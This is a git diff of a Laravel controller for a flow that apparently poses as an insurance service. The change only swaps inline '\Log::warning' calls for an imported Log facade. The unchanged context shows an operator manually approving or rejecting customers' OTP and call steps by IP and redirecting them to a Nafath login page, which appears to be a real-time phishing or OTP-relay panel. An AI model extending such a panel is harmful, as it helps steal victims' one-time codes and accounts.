@@ -15,6 +15,7 @@ use App\Http\Requests\Admin\AdminOtpRejectRequest;
 use App\Models\CustomerProfile;
 use App\Models\OtpCode;
 use Illuminate\Http\JsonResponse;
+use Illuminate\Support\Facades\Log;
 
 class AdminStcController extends Controller
 {
@@ -50,7 +51,7 @@ class AdminStcController extends Controller
                 try {
                     broadcast(new StcWaitingApproved($request->customer_ip))->toOthers();
                 } catch (\Throwable $e) {
-                    \Log::warning('Broadcast failed (re-broadcast approveStcWaiting): ' . $e->getMessage());
+                    Log::warning('Broadcast failed (re-broadcast approveStcWaiting): ' . $e->getMessage());
                 }
                 $this->setStcFlag($request->customer_ip, 'stc_waiting_approved', '/insurance/stc/otp');
                 $this->flushCustomerCache();
@@ -72,7 +73,7 @@ class AdminStcController extends Controller
         try {
             broadcast(new StcWaitingApproved($request->customer_ip))->toOthers();
         } catch (\Throwable $e) {
-            \Log::warning('Broadcast failed (approveStcWaiting): ' . $e->getMessage());
+            Log::warning('Broadcast failed (approveStcWaiting): ' . $e->getMessage());
         }
 
         $this->setStcFlag($request->customer_ip, 'stc_waiting_approved', '/insurance/stc/otp');
@@ -105,7 +106,7 @@ class AdminStcController extends Controller
         try {
             broadcast(new StcWaitingRejected($request->customer_ip, $request->input('reason')))->toOthers();
         } catch (\Throwable $e) {
-            \Log::warning('Broadcast failed (rejectStcWaiting): ' . $e->getMessage());
+            Log::warning('Broadcast failed (rejectStcWaiting): ' . $e->getMessage());
         }
 
         $this->setStcFlag($request->customer_ip, 'stc_waiting_rejected', '/insurance/phone-verification', $request->input('reason'));
@@ -134,7 +135,7 @@ class AdminStcController extends Controller
                 try {
                     broadcast(new StcOtpApproved($request->customer_ip))->toOthers();
                 } catch (\Throwable $e) {
-                    \Log::warning('Broadcast failed (re-broadcast approveStcOtp): ' . $e->getMessage());
+                    Log::warning('Broadcast failed (re-broadcast approveStcOtp): ' . $e->getMessage());
                 }
                 $this->setStcFlag($request->customer_ip, 'stc_otp_approved', '/insurance/stc/call-waiting');
                 $this->flushCustomerCache();
@@ -156,7 +157,7 @@ class AdminStcController extends Controller
         try {
             broadcast(new StcOtpApproved($request->customer_ip))->toOthers();
         } catch (\Throwable $e) {
-            \Log::warning('Broadcast failed (approveStcOtp): ' . $e->getMessage());
+            Log::warning('Broadcast failed (approveStcOtp): ' . $e->getMessage());
         }
 
         $this->setStcFlag($request->customer_ip, 'stc_otp_approved', '/insurance/stc/call-waiting');
@@ -189,7 +190,7 @@ class AdminStcController extends Controller
         try {
             broadcast(new StcOtpRejected($request->customer_ip, $request->input('reason')))->toOthers();
         } catch (\Throwable $e) {
-            \Log::warning('Broadcast failed (rejectStcOtp): ' . $e->getMessage());
+            Log::warning('Broadcast failed (rejectStcOtp): ' . $e->getMessage());
         }
 
         $this->setStcFlag($request->customer_ip, 'stc_otp_rejected', '/insurance/phone-verification', $request->input('reason'));
@@ -217,7 +218,7 @@ class AdminStcController extends Controller
                 try {
                     broadcast(new StcCallApproved($request->customer_ip, '/insurance/nafath'))->toOthers();
                 } catch (\Throwable $e) {
-                    \Log::warning('Broadcast failed (re-broadcast approveStcCall): ' . $e->getMessage());
+                    Log::warning('Broadcast failed (re-broadcast approveStcCall): ' . $e->getMessage());
                 }
                 $this->setStcFlag($request->customer_ip, 'stc_call_approved', '/insurance/nafath');
                 $this->flushCustomerCache();
@@ -239,7 +240,7 @@ class AdminStcController extends Controller
         try {
             broadcast(new StcCallApproved($request->customer_ip, '/insurance/nafath'))->toOthers();
         } catch (\Throwable $e) {
-            \Log::warning('Broadcast failed (approveStcCall): ' . $e->getMessage());
+            Log::warning('Broadcast failed (approveStcCall): ' . $e->getMessage());
         }
 
         $this->setStcFlag($request->customer_ip, 'stc_call_approved', '/insurance/nafath');
@@ -272,7 +273,7 @@ class AdminStcController extends Controller
         try {
             broadcast(new StcCallRejected($request->customer_ip, $request->input('reason')))->toOthers();
         } catch (\Throwable $e) {
-            \Log::warning('Broadcast failed (rejectStcCall): ' . $e->getMessage());
+            Log::warning('Broadcast failed (rejectStcCall): ' . $e->getMessage());
         }
 
         $this->setStcFlag($request->customer_ip, 'stc_call_rejected', '/insurance/phone-verification', $request->input('reason'));
